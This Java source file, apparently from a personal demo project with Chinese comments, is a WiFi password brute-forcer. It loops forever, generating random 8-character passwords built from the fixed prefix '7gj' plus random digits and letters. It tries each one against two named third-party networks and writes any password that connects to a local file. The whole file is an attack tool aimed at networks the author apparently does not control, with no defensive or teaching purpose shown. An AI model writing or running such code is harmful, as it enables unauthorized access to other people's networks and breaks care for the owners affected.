package com.example.sbootdemo.wificonnect;

import java.io.FileWriter;
import java.time.LocalTime;
import java.util.Random;

/**
 * wifi操作主方法
 *
 * @Author: wzh
 * @Date: 2019/7/13 0013 上午 8:34
 */
public class NetworkDemo {
    public static void main(String[] args) throws Exception{
        //需要连接的wifi名集合
        String[] ssid = {"CMCC-h999","CMCC-ERpa"};
        //如果密码中只包含小写字符和数字，分别声明数组方便随机取值
        String[] word = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"};
        String[] data = {"1","2","3","4","5","6","7","8","9","0"};

        for (;;){
            //8位数密码，假设为3个数字和5个小写字母组成
            String[] res = {"7","g","j",data[(int)(Math.random()*10)],data[(int)(Math.random()*10)],word[new Random().nextInt(26)],
                    word[new Random().nextInt(26)],word[new Random().nextInt(26)]};
            //随机打乱数组的方法
            String temp;
            for (int i=0;i<8;i++){
                int index = new Random().nextInt(8);
                temp = res[i];
                res[i] = res[index];
                res[index] = temp;
            }
            //按顺序拼接数组res为一个字符串，得出随机8位密码
            StringBuilder builder = new StringBuilder();
            for (int i=0;i<8;i++){
                builder.append(res[i]);
            }
            String password = builder.toString();
            System.out.println("check : " + password + "\n" + LocalTime.now());
            //将该密码分别作用上面的wifi名，进行配置文件的更新、连接、ping测试，如果ping通，将该密码保存到指定文件，并退出整个for循环
            for(int i=0;i<2;i++){
                boolean check = NetworkUtils.check(ssid[i], password);
                if (check){
                    FileWriter writer = new FileWriter("E:\\network\\password.txt");
                    writer.write(password);
                    writer.close(); //加close才能刷出缓存中的数据
                    return;         //return才能退出整个循环
                }
            }
        }

    }
}
